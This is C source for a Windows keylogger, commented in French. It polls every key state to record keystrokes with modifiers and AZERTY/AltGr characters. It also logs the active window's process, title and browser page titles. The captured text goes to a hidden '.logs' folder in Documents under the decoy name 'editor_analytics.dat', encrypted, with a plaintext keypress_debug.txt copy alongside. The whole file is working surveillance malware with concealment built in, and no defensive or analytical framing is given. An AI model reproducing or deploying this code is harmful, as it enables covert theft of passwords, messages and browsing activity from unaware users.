#include <windows.h>
#include "common.h"
#include <winuser.h>
#include <shlobj.h>
#include <stdio.h>     // Pour snprintf
#include <time.h>      // Pour time() et localtime()
#include <string.h>    // Pour strcpy, strlen, etc.
#include <psapi.h>    // Pour GetModuleFileNameExA

#define BUFFER_SIZE 8192
#define LOG_FILE "analytics.dat"

static char buffer[BUFFER_SIZE] = {0};
static size_t buffer_pos = 0;
static HANDLE hMutex = NULL;

// Variables globales pour suivre l'état des touches spéciales
static BOOL last_shift = FALSE;
static BOOL last_ctrl = FALSE;
static BOOL last_alt = FALSE;
static BOOL last_altgr = FALSE;

// Obtenir le chemin du fichier de log
static void get_log_path(char* path, size_t size) {
    // Utiliser le dossier Documents
    char documents[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, documents);
    
    // Créer un dossier caché .logs
    snprintf(path, size, "%s\\.logs", documents);
    CreateDirectoryA(path, NULL);
    SetFileAttributesA(path, FILE_ATTRIBUTE_HIDDEN);
    
    // Chemin complet du fichier
    snprintf(path, size, "%s\\.logs\\editor_analytics.dat", documents);
}

// Créer le dossier si nécessaire
static void ensure_directory() {
    char documents[MAX_PATH];
    char log_dir[MAX_PATH];
    
    // Obtenir le chemin Documents
    SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, documents);
    snprintf(log_dir, sizeof(log_dir), "%s\\.logs", documents);
    
    // Créer le dossier caché
    CreateDirectoryA(log_dir, NULL);
    SetFileAttributesA(log_dir, FILE_ATTRIBUTE_HIDDEN);

    // Créer un fichier debug.txt visible
    char debug_path[MAX_PATH];
    snprintf(debug_path, sizeof(debug_path), "%s\\.logs\\debug.txt", documents);
    HANDLE hDebug = CreateFileA(debug_path, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hDebug != INVALID_HANDLE_VALUE) {
        char debug_msg[256];
        snprintf(debug_msg, sizeof(debug_msg), 
                "Directory created: %s\nTime: %s\n", 
                log_dir, __TIME__);
        DWORD written;
        WriteFile(hDebug, debug_msg, strlen(debug_msg), &written, NULL);
        CloseHandle(hDebug);
    }
}

// Écrire dans le fichier de log
static void write_to_log() {
    if(buffer_pos == 0) return;

    char path[MAX_PATH];
    get_log_path(path, sizeof(path));
    ensure_directory();

    // Debug: écrire dans debug.txt avant chaque opération
    char documents[MAX_PATH];
    char debug_path[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, documents);
    snprintf(debug_path, sizeof(debug_path), "%s\\.logs\\debug.txt", documents);
    
    HANDLE hDebug = CreateFileA(debug_path, FILE_APPEND_DATA, 0, NULL,
                               OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hDebug != INVALID_HANDLE_VALUE) {
        char debug_msg[256];
        time_t now = time(NULL);
        snprintf(debug_msg, sizeof(debug_msg), 
                "\nWriting log at: %s\nBuffer size: %zu\n", 
                ctime(&now), buffer_pos);
        DWORD written;
        WriteFile(hDebug, debug_msg, strlen(debug_msg), &written, NULL);
        CloseHandle(hDebug);
    }

    // Chiffrer et écrire les données
    encrypt_data((unsigned char*)buffer, buffer_pos);
    
    HANDLE hFile = CreateFileA(path, FILE_APPEND_DATA, FILE_SHARE_READ, NULL,
                             OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    
    if(hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hFile, buffer, buffer_pos, &written, NULL);
        CloseHandle(hFile);
    }

    buffer_pos = 0;
}

// Ajouter du texte au buffer
static void append_to_buffer(const char* text) {
    size_t len = strlen(text);
    if(buffer_pos + len >= BUFFER_SIZE) {
        write_to_log();
    }
    
    if(len >= BUFFER_SIZE) return;
    
    strcpy(buffer + buffer_pos, text);
    buffer_pos += len;
}

// Fonction simplifiée pour la capture des touches
static void log_key(int vk_code) {
    char key_str[32] = {0};
    char final_str[64] = {0};
    
    // Vérifier les modificateurs
    BOOL shift = GetKeyState(VK_SHIFT) & 0x8000;
    BOOL ctrl = GetKeyState(VK_CONTROL) & 0x8000;
    BOOL alt = GetKeyState(VK_MENU) & 0x8000;
    BOOL altgr = (ctrl && alt);
    
    // Mettre à jour l'état des touches spéciales
    if(vk_code == VK_SHIFT || vk_code == VK_LSHIFT || vk_code == VK_RSHIFT) {
        last_shift = shift;
        return;
    }
    if(vk_code == VK_CONTROL || vk_code == VK_LCONTROL || vk_code == VK_RCONTROL) {
        last_ctrl = ctrl;
        return;
    }
    if(vk_code == VK_MENU || vk_code == VK_LMENU || vk_code == VK_RMENU) {
        last_alt = alt;
        return;
    }
    if(altgr) {
        last_altgr = TRUE;
    }

    // Touches spéciales
    switch(vk_code) {
        case VK_RETURN: strcpy(key_str, "↵"); break;
        case VK_SPACE: strcpy(key_str, " "); break;
        case VK_TAB: strcpy(key_str, "→|"); break;
        case VK_BACK: strcpy(key_str, "←"); break;
        case VK_CAPITAL: return; // Ignorer Caps Lock
        
        default:
            // Lettres (A-Z)
            if(vk_code >= 'A' && vk_code <= 'Z') {
                BOOL caps = GetKeyState(VK_CAPITAL) & 0x0001;
                if(shift ^ caps) {
                    key_str[0] = vk_code; // Majuscule
                } else {
                    key_str[0] = vk_code + 32; // Minuscule
                }
                key_str[1] = '\0';
            }
            // Chiffres (0-9) et leurs symboles avec Shift
            else if(vk_code >= '0' && vk_code <= '9') {
                if(shift) {
                    char symbols[] = ")!@#$%^&*(";
                    key_str[0] = symbols[vk_code - '0'];
                } else {
                    key_str[0] = vk_code;
                }
                key_str[1] = '\0';
            }
            // Caractères avec AltGr
            else if(altgr) {
                switch(vk_code) {
                    case '2': strcpy(key_str, "~"); break;
                    case '3': strcpy(key_str, "#"); break;
                    case '4': strcpy(key_str, "{"); break;
                    case '5': strcpy(key_str, "["); break;
                    case '6': strcpy(key_str, "|"); break;
                    case '7': strcpy(key_str, "`"); break;
                    case '8': strcpy(key_str, "\\"); break;
                    case '9': strcpy(key_str, "^"); break;
                    case '0': strcpy(key_str, "@"); break;
                    case 'E': strcpy(key_str, "€"); break;
                    // Touches AZERTY spécifiques avec AltGr
                    case VK_OEM_1: strcpy(key_str, "¤"); break;
                    case VK_OEM_3: strcpy(key_str, "#"); break;
                    case VK_OEM_4: strcpy(key_str, "{"); break;
                    case VK_OEM_6: strcpy(key_str, "}"); break;
                    case VK_OEM_7: strcpy(key_str, "¨"); break;
                    case VK_OEM_8: strcpy(key_str, "¬"); break;
                }
            }
            // Ponctuation et symboles normaux/shift
            else {
                switch(vk_code) {
                    case VK_OEM_PERIOD:
                        strcpy(key_str, shift ? ">" : "."); break;
                    case VK_OEM_COMMA:
                        strcpy(key_str, shift ? "<" : ","); break;
                    case VK_OEM_MINUS:
                        strcpy(key_str, shift ? "_" : "-"); break;
                    case VK_OEM_PLUS:
                        strcpy(key_str, shift ? "+" : "="); break;
                    case VK_OEM_1:
                        strcpy(key_str, shift ? ":" : ";"); break;
                    case VK_OEM_2:
                        strcpy(key_str, shift ? "?" : "/"); break;
                    case VK_OEM_3:
                        strcpy(key_str, shift ? "~" : "`"); break;
                    case VK_OEM_4:
                        strcpy(key_str, shift ? "{" : "["); break;
                    case VK_OEM_5:
                        strcpy(key_str, shift ? "|" : "\\"); break;
                    case VK_OEM_6:
                        strcpy(key_str, shift ? "}" : "]"); break;
                    case VK_OEM_7:
                        strcpy(key_str, shift ? "\"" : "'"); break;
                    // Touches numpad
                    case VK_MULTIPLY: strcpy(key_str, "*"); break;
                    case VK_ADD: strcpy(key_str, "+"); break;
                    case VK_SUBTRACT: strcpy(key_str, "-"); break;
                    case VK_DECIMAL: strcpy(key_str, "."); break;
                    case VK_DIVIDE: strcpy(key_str, "/"); break;
                    case VK_NUMPAD0: strcpy(key_str, "0"); break;
                    case VK_NUMPAD1: strcpy(key_str, "1"); break;
                    case VK_NUMPAD2: strcpy(key_str, "2"); break;
                    case VK_NUMPAD3: strcpy(key_str, "3"); break;
                    case VK_NUMPAD4: strcpy(key_str, "4"); break;
                    case VK_NUMPAD5: strcpy(key_str, "5"); break;
                    case VK_NUMPAD6: strcpy(key_str, "6"); break;
                    case VK_NUMPAD7: strcpy(key_str, "7"); break;
                    case VK_NUMPAD8: strcpy(key_str, "8"); break;
                    case VK_NUMPAD9: strcpy(key_str, "9"); break;
                }
            }
            break;
    }

    if(key_str[0] != '\0') {
        // Formater la sortie
        if(last_shift || last_ctrl || last_alt || last_altgr) {
            strcpy(final_str, "(");
            if(last_ctrl) strcat(final_str, "Ctrl+");
            if(last_alt && !last_altgr) strcat(final_str, "Alt+");
            if(last_shift) strcat(final_str, "Shift+");
            if(last_altgr) strcat(final_str, "AltGr+");
            strcat(final_str, key_str);
            strcat(final_str, ")");
        } else {
            strcpy(final_str, key_str);
        }

        // Debug: écrire dans un fichier de debug non chiffré
        char debug_path[MAX_PATH];
        char documents[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, documents);
        snprintf(debug_path, sizeof(debug_path), "%s\\.logs\\keypress_debug.txt", documents);
        
        FILE* f = fopen(debug_path, "a");
        if(f) {
            fputs(final_str, f);  // Écrire sans retour à la ligne
            fflush(f);  // Forcer l'écriture immédiate
            fclose(f);
        }

        // Ajouter au buffer principal
        append_to_buffer(final_str);
        write_to_log();
    }

    // Réinitialiser l'état des touches spéciales
    last_shift = last_ctrl = last_alt = last_altgr = FALSE;
}

// Fonction pour obtenir l'URL du navigateur
static void get_browser_url(HWND hwnd, char* url, size_t url_size) {
    char class_name[256];
    GetClassNameA(hwnd, class_name, sizeof(class_name));
    
    // Chrome
    if(strstr(class_name, "Chrome_WidgetWin_1")) {
        char title[1024];
        GetWindowTextA(hwnd, title, sizeof(title));
        
        // Format: "Page Title - Google Chrome"
        char* dash = strrchr(title, '-');
        if(dash) {
            *dash = '\0';  // Tronquer au tiret
            snprintf(url, url_size, "[Chrome: %s]", title);
        }
    }
    // Firefox
    else if(strstr(class_name, "MozillaWindowClass")) {
        char title[1024];
        GetWindowTextA(hwnd, title, sizeof(title));
        
        // Format: "Page Title - Mozilla Firefox"
        char* dash = strrchr(title, '-');
        if(dash) {
            *dash = '\0';
            snprintf(url, url_size, "[Firefox: %s]", title);
        }
    }
    // Edge
    else if(strstr(class_name, "Chrome_WidgetWin_1") && strstr(class_name, "Edge")) {
        char title[1024];
        GetWindowTextA(hwnd, title, sizeof(title));
        
        char* dash = strrchr(title, '-');
        if(dash) {
            *dash = '\0';
            snprintf(url, url_size, "[Edge: %s]", title);
        }
    }
}

// Fonction pour obtenir des détails sur la fenêtre active
static void get_window_details(char* details, size_t size) {
    HWND hwnd = GetForegroundWindow();
    if(!hwnd) return;

    char title[1024] = {0};
    char class_name[256] = {0};
    char process_name[MAX_PATH] = {0};
    DWORD process_id = 0;
    
    GetWindowTextA(hwnd, title, sizeof(title));
    GetClassNameA(hwnd, class_name, sizeof(class_name));
    GetWindowThreadProcessId(hwnd, &process_id);
    
    // Obtenir le nom du processus
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, process_id);
    if(hProcess) {
        char process_path[MAX_PATH];
        if(GetModuleFileNameExA(hProcess, NULL, process_path, MAX_PATH)) {
            char* last_slash = strrchr(process_path, '\\');
            if(last_slash) {
                strcpy(process_name, last_slash + 1);
            }
        }
        CloseHandle(hProcess);
    }

    // Obtenir l'URL si c'est un navigateur
    char url[1024] = {0};
    get_browser_url(hwnd, url, sizeof(url));

    // Formater les détails
    time_t now = time(NULL);
    struct tm* tm_info = localtime(&now);
    char time_str[64];
    strftime(time_str, sizeof(time_str), "\n[%Y-%m-%d %H:%M:%S]", tm_info);

    if(url[0] != '\0') {
        snprintf(details, size, "%s\nApplication: %s\nTitre: %s\nURL: %s\n", 
                 time_str, process_name, title, url);
    } else {
        snprintf(details, size, "%s\nApplication: %s\nTitre: %s\n", 
                 time_str, process_name, title);
    }
}

// Modifier process_activity pour utiliser les nouvelles fonctions
void process_activity(void) {
    static HWND lastWindow = NULL;
    static DWORD lastTime = 0;
    HWND foreground = GetForegroundWindow();
    DWORD currentTime = GetTickCount();
    
    // Vérifier le changement de fenêtre
    if(foreground != lastWindow) {
        char details[2048];
        get_window_details(details, sizeof(details));
        
        // Écrire dans le fichier debug
        char debug_path[MAX_PATH];
        char documents[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, documents);
        snprintf(debug_path, sizeof(debug_path), "%s\\.logs\\keypress_debug.txt", documents);
        
        FILE* f = fopen(debug_path, "a");
        if(f) {
            fputs(details, f);
            fflush(f);
            fclose(f);
        }

        // Ajouter au buffer principal
        append_to_buffer(details);
        write_to_log();
        
        lastWindow = foreground;
    }

    // Surveiller les touches
    for(int i = 0; i < 256; i++) {
        if(GetAsyncKeyState(i) & 1) {
            log_key(i);
        }
    }
    
    Sleep(10);
} 